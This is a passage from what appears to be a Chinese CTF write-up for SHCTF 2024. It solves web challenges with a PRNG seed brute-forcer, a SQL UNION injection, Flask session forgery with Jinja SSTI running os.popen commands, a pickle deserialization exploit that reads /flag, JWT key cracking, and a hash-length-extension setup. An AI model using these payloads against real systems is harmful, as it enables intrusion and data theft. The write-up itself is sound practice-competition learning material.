</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>50</span>; <span style=color:#f92672>++</span>i) {
</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> decrypted[i];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=ppc>PPC</h2><h3 id=绑定qq账号>绑定QQ账号</h3><p>在qq群绑定一下就行，然后网站出flag，记得刷新一下就行</p><h1 id=week2>week2</h1><h2 id=web-1>web</h2><h3 id=guess_the_number>guess_the_number</h3><pre tabindex=0><code>import requests
import random

first_num = 2060849645


def find_flag():
    for seed in range(1000000, 9999999):
        random.seed(seed)
        # 生成 first_num，以确保我们使用的是同一个种子
        generated_first_num = random.randint(1000000000, 9999999999)

        if generated_first_num == first_num:
            # 生成 second_num
            second_num = random.randint(1000000000, 9999999999)

            # 发送请求到 /guess
            url = f&#34;http://210.44.150.15:25676/guess?num={second_num}&#34;
            response = requests.get(url)

            # 打印每次请求的结果
            print(
                f&#39;Seed: {seed}, First Num: {generated_first_num}, Second Num: {second_num}, Response: {response.text}&#39;)

            # 检查响应内容中是否包含 flag
            if &#39;flag&#39; in response.text:
                print(f&#39;Found flag with seed {seed}: {response.text}&#39;)
                break  # 找到后退出循环


find_flag()
</code></pre><h3 id=自助查询>自助查询</h3><p>前面正常的查询最后一步有提示是注释里，查询<code> column_comment</code>得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#34;) UNION SELECT column_name, column_comment FROM information_schema.columns WHERE table_name=&#39;flag&#39; --
</span></span></span></code></pre></div><h3 id=入侵者禁入>入侵者禁入</h3><p>考察的session，需要利用模板注入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 flask_session_cookie_manager3.py encode -s <span style=color:#e6db74>&#39;0day_joker&#39;</span> -t <span style=color:#e6db74>&#39;{&#34;role&#34;:{&#34;flag&#34;:&#34;{{ 7*7 }}&#34;,&#34;is_admin&#34;:1}}&#39;</span>
</span></span></code></pre></div><p>测试到有注入点</p><p>然后测试</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>TEMPLATE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;{\&#34;role\&#34;:{\&#34;flag\&#34;:\&#34;{% print(url_for.__globals__[\\&#39;__builtins__\\&#39;][\\&#39;eval\\&#39;](\\\&#34;__import__(\\\\\\&#39;os\\\\\\&#39;).popen(\\\\\\&#39;ls \\/\\\\\\&#39;).read()\\\&#34;)) %}\&#34;,\&#34;is_admin\&#34;:1}}&#34;</span>
</span></span><span style=display:flex><span>python3 flask_session_cookie_manager3.py encode -s <span style=color:#e6db74>&#39;0day_joker&#39;</span> -t <span style=color:#e6db74>&#34;</span>$TEMPLATE<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p>发现有flag,最后</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ TEMPLATE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;{\&#34;role\&#34;:{\&#34;flag\&#34;:\&#34;{% print(url_for.__globals__[\\&#39;__builtins__\\&#39;][\\&#39;eval\\&#39;](\\\&#34;__import__(\\\\\\&#39;os\\\\\\&#39;).popen(\\\\\\&#39;cat \\/flag\\\\\\&#39;).read()\\\&#34;)) %}\&#34;,\&#34;is_admin\&#34;:1}}&#34;</span>
</span></span><span style=display:flex><span>python3 flask_session_cookie_manager3.py encode -s <span style=color:#e6db74>&#39;0day_joker&#39;</span> -t <span style=color:#e6db74>&#34;</span>$TEMPLATE<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><p><img alt=14 loading=lazy src=/posts/ctf/shctf2024/14.png></p><p><img alt=15 loading=lazy src=/posts/ctf/shctf2024/15.png></p><h3 id=dickle>dickle</h3><p>pickle序列化，简单的尝试了一下，注意环境需要用linux运行脚本，得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#75715e># 使用 subprocess 来执行命令并返回其输出</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (subprocess<span style=color:#f92672>.</span>getoutput, (<span style=color:#e6db74>&#39;cat /flag&#39;</span>,))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 序列化 Exploit 对象</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(Exploit())
</span></span><span style=display:flex><span>encoded_payload <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(payload)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(encoded_payload)
</span></span></code></pre></div><p>得到的flag的为类似下方的，需要简单调节拼接一下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Deserialized data: [&#39;S&#39;, &#39;H&#39;, &#39;C&#39;, &#39;T&#39;, &#39;F&#39;,
</span></span></code></pre></div><h3 id=登录验证>登录验证</h3><p>登陆拿去cookie用jwt_tool爆破一下密钥</p><p><img alt=16 loading=lazy src=/posts/ctf/shctf2024/16.png></p><p>前端是弱密码admin:admin，然后也把cookie改一下得到flag</p><p><img alt=17 loading=lazy src=/posts/ctf/shctf2024/17.png></p><h3 id=md5-god复现>MD5 GOD!(复现)</h3><p>先看源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib<span style=color:#f92672>,</span> os<span style=color:#f92672>,</span> random
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#34;SECRET_KEY&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Th1s_is_5ecr3t_k3y&#34;</span>
</span></span><span style=display:flex><span>salt <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5</span>(data):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(data)<span style=color:#f92672>.</span>hexdigest()<span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_sign</span>(sign, username, msg, salt):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> sign <span style=color:#f92672>==</span> md5(salt <span style=color:#f92672>+</span> msg <span style=color:#f92672>+</span> username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getRandom</span>(str_length<span style=color:#f92672>=</span><span style=color:#ae81ff>16</span>):
</span></span><span style=display:flex><span>    random_str <span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    base_str <span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#39;</span>
</span></span><span style=display:flex><span>    length <span style=color:#f92672>=</span>len(base_str) <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(str_length):
</span></span><span style=display:flex><span>        random_str <span style=color:#f92672>+=</span>base_str[random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>0</span>, length)]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> random_str
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>sign_users <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sign&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;msg&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/login&#34;</span>)
</span></span><span style=display:flex><span>    sign <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sign&#39;</span>)
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;msg&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> check_sign(sign, username, msg, salt):
</span></span><span style=display:flex><span>        sign_users[username<span style=color:#f92672>.</span>decode()] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;签到成功&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/login&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/login&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(password)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username <span style=color:#f92672>in</span> users <span style=color:#f92672>and</span> users[username] <span style=color:#f92672>==</span> password:
</span></span><span style=display:flex><span>            session[<span style=color:#e6db74>&#34;username&#34;</span>] <span style=color:#f92672>=</span> username<span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>            session[<span style=color:#e6db74>&#34;msg&#34;</span>] <span style=color:#f92672>=</span> md5(salt <span style=color:#f92672>+</span> password<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>            session[<span style=color:#e6db74>&#34;sign&#34;</span>] <span style=color:#f92672>=</span> md5(salt <span style=color:#f92672>+</span> md5(salt <span style=color:#f92672>+</span> password<span style=color:#f92672>.</span>encode()) <span style=color:#f92672>+</span> username<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;登陆成功&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;登陆失败&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;login.html&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/users&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>user</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> json<span style=color:#f92672>.</span>dumps(sign_users)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>flag</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> user <span style=color:#f92672>in</span> users:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> sign_users[user] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;flag{杂鱼~}&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(<span style=color:#e6db74>&#39;/flag&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> users, sign_users
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> getRandom(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>        pwd <span style=color:#f92672>=</span> getRandom(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>        users[username] <span style=color:#f92672>=</span> pwd
</span></span><span style=display:flex><span>        sign_users[username] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    users[<span style=color:#e6db74>&#34;student&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;student&#34;</span>
</span></span><span style=display:flex><span>    sign_users[<span style=color:#e6db74>&#34;student&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>init()
</span></span></code></pre></div><p>题目的要求是64个用户全部签到就可以得到flag了</p><p>访问<code>/users</code>可以得到用户的信息</p><p><code>/login</code> 路由可以登陆</p><p><code>/</code> 路由是签到的</p><p><code>/flag</code>可以得到flag</p><p>定位一下关键脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_sign</span>(sign, username, msg, salt):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> sign <span style=color:#f92672>==</span> md5(salt <span style=color:#f92672>+</span> msg <span style=color:#f92672>+</span> username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sign&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>or</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;msg&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/login&#34;</span>)
</span></span><span style=display:flex><span>    sign <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;sign&#39;</span>)
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;msg&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> check_sign(sign, username, msg, salt):
</span></span><span style=display:flex><span>        sign_users[username<span style=color:#f92672>.</span>decode()] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;签到成功&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/login&#34;</span>)
</span></span></code></pre></div><p>可以知道，只要session里的 <code>sign</code> 和最终 <code>md5(salt + msg + username)</code> 相等即可签到成功</p><p>这里的salt是未知的，但最初的账号 student 的所有信息是已知的，可以用这个账号的相关信息来做hash长度拓展攻击</p><p>hash长度拓展之前打base有个现成的脚本</p><p>接着是session伪造，<code>SECRET_KEY</code> 已经给出是 <code>Th1s_is_5ecr3t_k3y</code>可以调用<code>flask_session_cookie_manager3.py</code>里的代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> math
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> typing <span style=color:#f92672>import</span> Any, Dict, List
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rotate_amounts <span style=color:#f92672>=</span> [<span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>22</span>,
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>20</span>,
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>23</span>,
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>21</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>constants <span style=color:#f92672>=</span> [int(abs(math<span style=color:#f92672>.</span>sin(i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>**</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span> <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>functions <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> b, c, d: (b <span style=color:#f92672>&amp;</span> c) <span style=color:#f92672>|</span> (<span style=color:#f92672>~</span>b <span style=color:#f92672>&amp;</span> d)] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>            <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> b, c, d: (d <span style=color:#f92672>&amp;</span> b) <span style=color:#f92672>|</span> (<span style=color:#f92672>~</span>d <span style=color:#f92672>&amp;</span> c)] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>            <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> b, c, d: b <span style=color:#f92672>^</span> c <span style=color:#f92672>^</span> d] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>            <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> b, c, d: c <span style=color:#f92672>^</span> (b <span style=color:#f92672>|</span> <span style=color:#f92672>~</span>d)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>index_functions <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> i: i] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> i: (<span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> i: (<span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>] <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>                  <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> [<span style=color:#66d9ef>lambda</span> i: (<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> i) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_init_values</span>(A: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x67452301</span>, B: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xefcdab89</span>, C: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x98badcfe</span>, D: int <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10325476</span>) <span style=color:#f92672>-&gt;</span> List[int]:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [A, B, C, D]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>left_rotate</span>(x, amount):
</span></span><span style=display:flex><span>    x <span style=color:#f92672>&amp;=</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ((x <span style=color:#f92672>&lt;&lt;</span> amount) <span style=color:#f92672>|</span> (x <span style=color:#f92672>&gt;&gt;</span> (<span style=color:#ae81ff>32</span> <span style=color:#f92672>-</span> amount))) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>padding_message</span>(msg: bytes) <span style=color:#f92672>-&gt;</span> bytes:
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    填充的方法如下：
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    orig_len_in_bits <span style=color:#f92672>=</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>*</span> len(msg)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffffffffffff</span>
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> bytes([<span style=color:#ae81ff>0x80</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(msg) <span style=color:#f92672>%</span> <span style=color:#ae81ff>64</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>56</span>:
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> bytes([<span style=color:#ae81ff>0x00</span>])
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> orig_len_in_bits<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>8</span>, byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> msg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
